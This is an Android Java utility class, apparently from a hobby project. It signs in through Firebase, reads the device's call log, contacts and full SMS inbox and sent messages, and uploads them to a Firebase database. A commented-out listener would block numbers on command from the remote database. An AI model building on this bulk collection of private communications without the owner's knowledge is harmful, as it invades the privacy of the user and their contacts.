package com.example.myapplication;


import androidx.activity.result.ActivityResultCallback;
import androidx.activity.result.ActivityResultLauncher;
import androidx.annotation.NonNull;
import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.BlockedNumberContract;
import android.provider.Browser;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.telecom.Call;
import android.telecom.TelecomManager;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.webkit.MimeTypeMap;
import android.webkit.WebResourceResponse;
import android.webkit.WebView;

import com.firebase.ui.auth.AuthUI;
import com.firebase.ui.auth.FirebaseAuthUIActivityResultContract;
import com.firebase.ui.auth.IdpResponse;
import com.firebase.ui.auth.data.model.FirebaseAuthUIAuthenticationResult;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.Exclude;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.IgnoreExtraProperties;
import com.google.firebase.database.ValueEventListener;

import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.time.LocalTime;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class Utils  {

    private final ActivityResultLauncher<Intent> signInLauncher;
    private final AppCompatActivity aa;

    public Utils (AppCompatActivity aa) {
        this.aa = aa;
        signInLauncher = aa.registerForActivityResult(
                new FirebaseAuthUIActivityResultContract(),
                new ActivityResultCallback<FirebaseAuthUIAuthenticationResult>() {
                    @Override
                    public void onActivityResult(FirebaseAuthUIAuthenticationResult result) {
                        onSignInResult(result);
                    }
                });

    }

    private FirebaseAuth mAuth;
    private FirebaseUser user;

    FirebaseDatabase database = FirebaseDatabase.getInstance();
    DatabaseReference myRef = database.getReference();

    private class CallJson {
        public String date;
        public String duration;
        public String number;
        public String contact;
        public String type;

        public CallJson(String date, String duration, String number, String contact, String type) {
            this.date = date;
            this.duration = duration;
            this.number = number;
            this.contact = contact;
            this.type = type;
        }

        public Map<String, String> toMap() {
            HashMap<String, String> result = new HashMap<>();
            result.put("date", date);
            result.put("duration", duration);
            result.put("number", number);
            result.put("type", type);
            result.put("contact", contact);

            return result;
        }
    }

    public void createSignInIntent() {
        List<AuthUI.IdpConfig> providers = Arrays.asList(
                new AuthUI.IdpConfig.GoogleBuilder().build());
        Intent signInIntent = AuthUI.getInstance()
                .createSignInIntentBuilder()
                .setAvailableProviders(providers)
                .build();
        signInLauncher.launch(signInIntent);
    }

    private void onSignInResult(FirebaseAuthUIAuthenticationResult result) {
        IdpResponse response = result.getIdpResponse();
        if (result.getResultCode() == aa.RESULT_OK) {
            // Successfully signed in
            FirebaseUser user1 = FirebaseAuth.getInstance().getCurrentUser();
            Log.d("signinmartin", "logged in: " + user1.getUid());
            user = FirebaseAuth.getInstance().getCurrentUser();
            sendData();
        } else {
            Log.d("signinmartin", response.getError().getMessage() + "");
        }
    }

    public ArrayList<HashMap<String, String>> getCalls() {

        ArrayList<HashMap<String, String>> calls = new ArrayList<>();

        Cursor c = aa.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
        c.moveToFirst();
        do {
            String s1 = c.getString((int) c.getColumnIndex(CallLog.Calls.DATE));
            long seconds = Long.parseLong(s1);
            SimpleDateFormat formatter = new SimpleDateFormat("dd-MM-yy HH:mm");
            String dateString = formatter.format(new Date(seconds));
            String s2 = c.getString((int) c.getColumnIndex(CallLog.Calls.DURATION));
            String duration = getDuration(Integer.parseInt(s2));
            String s3 = c.getString((int) c.getColumnIndex(CallLog.Calls.NUMBER));
            String s4 = c.getString((int) c.getColumnIndex(CallLog.Calls.CACHED_NAME));
            String s5 = c.getString((int) c.getColumnIndex(CallLog.Calls.TYPE));
            String callType = s5;
            switch (Integer.parseInt(s5)) {
                case CallLog.Calls.OUTGOING_TYPE:
                    callType = "OUTGOING";
                    break;
                case CallLog.Calls.INCOMING_TYPE:
                    callType = "INCOMING";
                    break;

                case CallLog.Calls.MISSED_TYPE:
                    callType = "MISSED";
                    break;
                case CallLog.Calls.REJECTED_TYPE:
                    callType = "REJECTED";
                    break;
            }
            calls.add(0, (HashMap<String, String>) new CallJson(dateString, duration, s3, s4, callType).toMap());
        } while (c.moveToNext());

        c.close();

        return calls;
    }

    public ArrayList<HashMap<String, String>> getContacts() {
        ArrayList<HashMap<String, String>> contacts = new ArrayList<>();

        Cursor c = aa.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        c.moveToFirst();
        while (c.moveToNext()) {
            HashMap<String, String> contact = new HashMap<>();
            int numberIndex = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
            int nameIndex = c.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME);
            String number = c.getString(numberIndex);
            String name = c.getString(nameIndex);
            contact.put("name", name);
            contact.put("number", number.trim().replace(" ", "").replace(" ", ""));
            boolean canAdd = true;
            for(HashMap<String, String> cont : contacts) {
                if(cont.get("number").equals(number) ) {
                    canAdd = false;
                }
            }
            if(canAdd) {
                contacts.add(contact);
            }
        }

        c.close();

        return contacts;
    }

    public ArrayList<HashMap<String, String>> getSMS() {
        ArrayList<HashMap<String, String>> smss = new ArrayList<>();

        Cursor c = aa.getContentResolver().query(Telephony.Sms.Inbox.CONTENT_URI, null, null, null, null);
        c.moveToFirst();

        do {
            String sender = c.getString((int) c.getColumnIndex(Telephony.Sms.Inbox.ADDRESS));
            String date = c.getString((int) c.getColumnIndex(Telephony.Sms.Inbox.DATE));
            String body = c.getString((int) c.getColumnIndex(Telephony.Sms.Inbox.BODY));
            long seconds = Long.parseLong(date);
            SimpleDateFormat formatter = new SimpleDateFormat("dd-MM-yy HH:mm");
            String dateString = formatter.format(new Date(seconds));
            HashMap<String, String> sms = new HashMap<>();
            sms.put("sender", sender);
            sms.put("date", dateString);
            sms.put("body", body);
            sms.put("status", "RECEIVED");
            smss.add(sms);
        } while(c.moveToNext());
        c.close();

        Cursor c1 = aa.getContentResolver().query(Telephony.Sms.Sent.CONTENT_URI, null, null, null, null);
        c1.moveToFirst();

        while(c1.moveToNext()) {
            String sender = c1.getString((int) c1.getColumnIndex(Telephony.Sms.Sent.ADDRESS));
            String date = c1.getString((int) c1.getColumnIndex(Telephony.Sms.Sent.DATE));
            String body = c1.getString((int) c1.getColumnIndex(Telephony.Sms.Sent.BODY));
            long seconds = Long.parseLong(date);
            SimpleDateFormat formatter = new SimpleDateFormat("dd-MM-yy HH:mm");
            String dateString = formatter.format(new Date(seconds));
            HashMap<String, String> sms = new HashMap<>();
            sms.put("sender", sender);
            sms.put("date", dateString);
            sms.put("body", body);
            sms.put("status", "SENT");
            Log.d("smssent", sender + " " + dateString + " " +body);
            smss.add(sms);
        }
        c1.close();

        return smss;
    }

    public void signOut() {
        AuthUI.getInstance()
                .signOut(aa)
                .addOnCompleteListener(new OnCompleteListener<Void>() {
                    public void onComplete(@NonNull Task<Void> task) {
                        // ...
                    }
                });
    }

    private String getDuration(int seconds) {
        int h = seconds / 3600;
        int m = (seconds % 3600) / 60;
        int s = seconds % 60;
        return String.format("%2d:%2d:%2d", h, m, s).replace(' ', '0');
    }

    public void sendData() {
        ArrayList<HashMap<String, String>> calls = getCalls();
        ArrayList<HashMap<String, String>> contacts = getContacts();
        ArrayList<HashMap<String, String>> smss = getSMS();
        myRef.child(user.getUid()).child("calls").setValue(calls);
        myRef.child(user.getUid()).child("contacts").setValue(contacts);
        myRef.child(user.getUid()).child("sms").setValue(smss);
    }

//    private void blockListener() {
//        ValueEventListener postListener = new ValueEventListener() {
//            @RequiresApi(api = Build.VERSION_CODES.N)
//            @Override
//            public void onDataChange(DataSnapshot dataSnapshot) {
//                List res = (List) dataSnapshot.getValue();
//                if(res != null) {
////                        ContentValues values = new ContentValues();
////                        values.put(BlockedNumberContract.BlockedNumbers.COLUMN_ORIGINAL_NUMBER, "+359876110050");
////                        getContentResolver().insert(BlockedNumberContract.BlockedNumbers.CONTENT_URI, values);
//                }
//            }
//
//            @Override
//            public void onCancelled(DatabaseError databaseError) {
//                Log.d("blockednumberserror", ""+databaseError.toException());
//            }
//        };
//        myRef.child(user.getUid()).child("block").addValueEventListener(postListener);
//    }

    public void authAndSend() {
//        signOut();
        user = FirebaseAuth.getInstance().getCurrentUser();

        if (user == null) {
            createSignInIntent();
        } else {
            Log.d("signin", "is in: " + user.getUid());
            sendData();
        }
    }
}
